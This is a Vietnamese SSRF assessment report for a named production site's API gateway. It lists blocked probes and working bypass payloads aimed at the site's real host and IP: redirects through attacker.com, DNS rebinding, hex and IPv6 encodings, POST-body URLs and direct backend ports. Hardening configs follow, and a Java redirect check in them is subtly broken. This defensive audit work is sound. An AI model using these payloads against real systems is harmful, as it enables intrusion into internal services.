# 🛡️ BÁO CÁO ĐÁNH GIÁ SSRF VỚI API GATEWAY

## 📊 TỔNG QUAN

Sau khi triển khai **API Gateway với SSRF Protection Filter**, hệ thống đã có khả năng phòng thủ tốt hơn đáng kể. Tuy nhiên, **SSRF vẫn có thể khai thác được trong một số trường hợp**.

---

## ✅ SSRF PROTECTION ĐANG HOẠT ĐỘNG

### 🔒 API Gateway Filter đang chặn:

#### 1. **Localhost & Loopback**
```bash
# ❌ BỊ CHẶN - 403 Forbidden
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://localhost:8081'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://127.0.0.1:8081'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://127.0.0.2'
```

#### 2. **Internal Service Hostnames**
```bash
# ❌ BỊ CHẶN - 403 Forbidden
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://user-service:8081'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://product-service:8082'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://postgres-user:5432'
```

#### 3. **Private IP Ranges**
```bash
# ❌ BỊ CHẶN - 403 Forbidden
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://192.168.1.1'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://10.0.0.1'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://172.16.0.1'
```

#### 4. **Cloud Metadata Endpoints**
```bash
# ❌ BỊ CHẶN - 403 Forbidden
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://169.254.169.254/metadata'
```

### 📊 Test Kết Quả (Trên Server Production):
```
Test localhost SSRF → HTTP Status: 403 ✅
Test internal service SSRF → HTTP Status: 403 ✅
Test private IP SSRF → HTTP Status: 403 ✅
Gateway logs: [SSRF ALERT] Potentially vulnerable endpoint accessed! ✅
```

---

## ⚠️ SSRF VẪN CÓ THỂ KHAI THÁC

### 🔓 Các Vector Bypass Gateway Filter:

#### 1. **Bypass qua Redirect Chain**
API Gateway chỉ kiểm tra query parameter, **không theo dõi HTTP redirects**:

```bash
# ✅ CÓ THỂ KHAI THÁC
# Tạo URL trên server công khai redirect về internal service
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=https://attacker.com/redirect?target=http://user-service:8081'
```

**Cách thức:**
- `attacker.com/redirect` trả về `302 Found` với `Location: http://user-service:8081`
- Gateway filter pass (URL hợp lệ), nhưng product-service follow redirect → SSRF thành công!

#### 2. **DNS Rebinding Attack**
Thay đổi DNS resolution giữa 2 requests:

```bash
# ✅ CÓ THỂ KHAI THÁC
# Domain attacker.com ban đầu resolve về 1.1.1.1 (public IP)
# Sau 60 giây, TTL hết hạn, resolve về 192.168.1.1 (private IP)
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://attacker.com/exploit'
```

#### 3. **URL Encoding & Obfuscation**
Bypass filter bằng encoding tricks:

```bash
# ✅ CÓ THỂ KHAI THÁC NẾU FILTER KHÔNG DECODE CORRECTLY
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http%3A%2F%2F127.0.0.1%3A8081'
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://[::1]:8081'  # IPv6 localhost
curl 'https://quangtx.io.vn/api/products/1/check_price?compare_url=http://0x7f000001:8081'  # Hex IP
```

#### 4. **Blind SSRF qua Backend Services**
Nếu **gọi trực tiếp backend services** (không qua gateway):

```bash
# ✅ CÓ THỂ KHAI THÁC NẾU PORTS EXPOSE RA PUBLIC
# User-service port 8081 nếu mở ra ngoài
curl -X POST 'http://103.56.163.193:8081/api/users/register' \
  -H 'Content-Type: application/json' \
  -d '{
    "username": "attacker",
    "password": "pass123",
    "email": "admin@user-service:8081"  # ← Blind SSRF vào email validation
  }'
```

**Nguy hiểm:** Backend services không có SSRF protection filter!

#### 5. **SSRF qua File Upload**
```bash
# ✅ CÓ THỂ KHAI THÁC
# POST /api/users/me/avatar/validate
curl -X POST 'https://quangtx.io.vn/api/users/me/avatar/validate' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"avatar_url": "https://attacker.com/redirect-to-internal"}'
```

Gateway không filter POST body JSON fields!

#### 6. **SSRF qua fetch_review Endpoint**
```bash
# ✅ CÓ THỂ KHAI THÁC
# POST /api/products/fetch_review
curl -X POST 'https://quangtx.io.vn/api/products/fetch_review' \
  -H 'Content-Type: application/json' \
  -d '{"review_url": "https://attacker.com/redirect"}'
```

Gateway chỉ check query params, **không check POST body**!

---

## 🔍 KẾT LUẬN

### ✅ Gateway Protection HIỆU QUẢ với:
- ✅ Direct localhost/127.0.0.1 attacks
- ✅ Internal service hostname attacks
- ✅ Private IP range attacks (10.x, 192.168.x, 172.16-31.x)
- ✅ Cloud metadata endpoint attacks (169.254.169.254)
- ✅ Query parameter-based SSRF

### ⚠️ Gateway CÒN YẾU với:
- ❌ HTTP redirect chains (302/301 bypass)
- ❌ DNS rebinding attacks
- ❌ URL encoding obfuscation (IPv6, Hex IP, etc.)
- ❌ POST body JSON field attacks (không filter)
- ❌ Direct backend service access (nếu ports exposed)
- ❌ Email domain blind SSRF
- ❌ File upload URL validation SSRF

---

## 🛡️ KHUYẾN NGHỊ DEFENSE-IN-DEPTH

### 1. **Cấu hình Nginx chặn direct access**
```nginx
# /etc/nginx/sites-available/quangtx.io.vn
server {
    listen 443 ssl;
    server_name quangtx.io.vn;
    
    # ✅ CHỈ cho phép access qua Gateway
    location / {
        proxy_pass http://localhost:8080;  # Gateway only
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    
    # ❌ CHẶN direct access đến backend services
    location ~* ^/(user-service|product-service|inventory-service|order-service) {
        return 403;
    }
}
```

### 2. **Harden Backend Services**
```python
# product-service/products/views.py
from django.views.decorators.http import require_http_methods
from urllib.parse import urlparse
import socket

ALLOWED_DOMAINS = ['example.com', 'trusted-partner.com']

def is_safe_url(url):
    """Validate URL is not internal/private"""
    try:
        parsed = urlparse(url)
        
        # Block private schemes
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # Block internal hostnames
        if parsed.hostname in ['localhost', 'user-service', 'product-service', ...]:
            return False
        
        # Resolve IP and check if private
        ip = socket.gethostbyname(parsed.hostname)
        if ip.startswith(('127.', '10.', '192.168.', '172.16.', '169.254.')):
            return False
        
        # Whitelist domains only
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False
        
        return True
    except:
        return False

@require_http_methods(["GET", "POST"])
def check_price(request, product_id):
    compare_url = request.GET.get('compare_url') or request.POST.get('compare_url')
    
    # ✅ VALIDATE TRƯỚC KHI FETCH
    if not is_safe_url(compare_url):
        return JsonResponse({'error': 'Invalid URL'}, status=400)
    
    # ✅ DISABLE REDIRECTS
    response = requests.get(compare_url, allow_redirects=False, timeout=5)
    ...
```

### 3. **Docker Network Isolation**
```yaml
# docker-compose.prod.yml
services:
  api-gateway:
    networks:
      - public-network
      - internal-network
  
  user-service:
    networks:
      - internal-network  # ✅ Không expose ra public
    ports: []  # ✅ Không bind ports ra host
  
networks:
  public-network:
    driver: bridge
  internal-network:
    driver: bridge
    internal: true  # ✅ Isolated from external
```

### 4. **Firewall Rules**
```bash
# Chặn tất cả ports ngoại trừ 80/443 và SSH
sudo ufw default deny incoming
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw enable

# ✅ Backend services chỉ bind localhost
docker-compose.prod.yml:
  user-service:
    ports:
      - "127.0.0.1:8081:8081"  # Chỉ localhost access
```

### 5. **Enhanced Gateway Filter**
```java
// SSRFProtectionFilter.java - Improved version
public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
    // ✅ Check ALL parameters (query + body)
    MultiValueMap<String, String> params = exchange.getRequest().getQueryParams();
    
    // ✅ Check POST body for JSON fields
    return exchange.getRequest().getBody()
        .collectList()
        .flatMap(dataBuffers -> {
            String body = extractBody(dataBuffers);
            if (containsSuspiciousUrl(body)) {
                return blockRequest(exchange);
            }
            return chain.filter(exchange);
        });
}

// ✅ Follow redirects and validate final destination
private boolean validateUrlChain(String url) {
    HttpClient client = HttpClient.newBuilder()
        .followRedirects(HttpClient.Redirect.NEVER)  // Disable auto-redirect
        .build();
    
    // Manually check each hop in redirect chain
    String currentUrl = url;
    int maxHops = 5;
    
    for (int i = 0; i < maxHops; i++) {
        if (!isUrlSafe(currentUrl)) return false;
        
        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        
        if (response.statusCode() >= 300 && response.statusCode() < 400) {
            currentUrl = response.headers().firstValue("Location").orElse(null);
            if (currentUrl == null) break;
        } else {
            break;
        }
    }
    
    return true;
}
```

---

## 📋 CHECKLIST TRIỂN KHAI

### ✅ ĐÃ HOÀN THÀNH:
- [x] API Gateway deployed với SSRF Protection Filter
- [x] Redis cho rate limiting
- [x] JWT authentication trên protected routes
- [x] Logging tất cả SSRF attempts
- [x] Health checks cho gateway
- [x] Docker images pushed to Docker Hub
- [x] Production server deployment
- [x] Gateway routing cho 4 backend services

### ⚠️ CẦN LÀM THÊM (CRITICAL):
- [ ] **Cấu hình Nginx chỉ proxy qua gateway** (QUAN TRỌNG!)
- [ ] **Xóa/disable các endpoint SSRF-vulnerable** (check_price, fetch_review, share)
- [ ] **Add URL validation vào backend services** (defense-in-depth)
- [ ] **Disable HTTP redirects** trong requests.get() calls
- [ ] **Bind backend ports chỉ localhost** (127.0.0.1:8081 thay vì 0.0.0.0:8081)
- [ ] **Network isolation** (internal-network cho backend)
- [ ] **Firewall rules** chặn direct access backend ports
- [ ] **Enhanced filter** check POST body JSON fields
- [ ] **Remove admin registration** hoặc force role=USER
- [ ] **Email validation** không fetch external URLs

### 🔍 TESTING CẦN LÀM:
- [ ] Test redirect bypass với attacker-controlled server
- [ ] Test DNS rebinding attack
- [ ] Test URL encoding bypasses (IPv6, Hex, Octal)
- [ ] Test POST body SSRF (fetch_review, avatar_url)
- [ ] Test direct backend access từ external IP
- [ ] Penetration testing với Burp Suite Professional

---

## 🎯 TRẢ LỜI CÂU HỎI: "VẬY BÂY GIỜ CÓ KHAI THÁC ĐƯỢC SSRF KHÔNG?"

### Trả lời ngắn gọn:
**CÓ**, nhưng **KHÓ HƠN NHIỀU** so với trước khi có gateway.

### Giải thích chi tiết:

#### ❌ **KHÔNG KHAI THÁC ĐƯỢC** (với Gateway):
- Query parameter attacks với localhost/private IPs → 403 Forbidden
- Internal service hostname attacks → 403 Forbidden
- Metadata endpoint attacks → 403 Forbidden

#### ✅ **VẪN KHAI THÁC ĐƯỢC** (các bypass):
- HTTP redirect chains (302 bypass gateway filter)
- POST body JSON field SSRF (gateway không check body)
- Direct backend access nếu ports exposed (8081, 8082, 8083, 8084)
- DNS rebinding attacks
- URL encoding obfuscation

### 🛡️ Mức độ bảo mật:

| Tình huống | Trước Gateway | Sau Gateway | Sau Full Hardening |
|------------|---------------|-------------|-------------------|
| Query param SSRF | ❌ Dễ khai thác | ✅ Chặn được | ✅ Chặn được |
| Redirect bypass | ❌ Dễ khai thác | ❌ Dễ khai thác | ✅ Khó khai thác |
| POST body SSRF | ❌ Dễ khai thác | ⚠️ Trung bình | ✅ Khó khai thác |
| Direct backend | ❌ Dễ khai thác | ⚠️ Nếu ports exposed | ✅ Chặn được |
| DNS rebinding | ❌ Dễ khai thác | ❌ Dễ khai thác | ⚠️ Trung bình |

---

## 💡 RECOMMENDATION

**API Gateway là lớp phòng thủ đầu tiên tốt**, nhưng **KHÔNG ĐỦ**.

Cần áp dụng **Defense-in-Depth**:
1. ✅ Gateway Filter (đã có)
2. ⚠️ Nginx chặn direct access (CHƯA có)
3. ⚠️ Backend validation (CHƯA có)
4. ⚠️ Network isolation (CHƯA có)
5. ⚠️ Firewall rules (CHƯA có)

**Hiện tại: 1/5 lớp phòng thủ → Vẫn CÓ THỂ KHAI THÁC!**

---

## 📞 NEXT STEPS

1. **Ngay lập tức:** Cấu hình Nginx chỉ route qua gateway
2. **Trong 24h:** Xóa/disable các vulnerable endpoints
3. **Trong tuần:** Implement backend URL validation
4. **Trong tháng:** Full security audit + penetration testing

---

**Báo cáo tạo:** 2025-12-02  
**Environment:** Production Server (quangtx.io.vn)  
**Status:** ⚠️ PARTIALLY PROTECTED - Cần hardening thêm
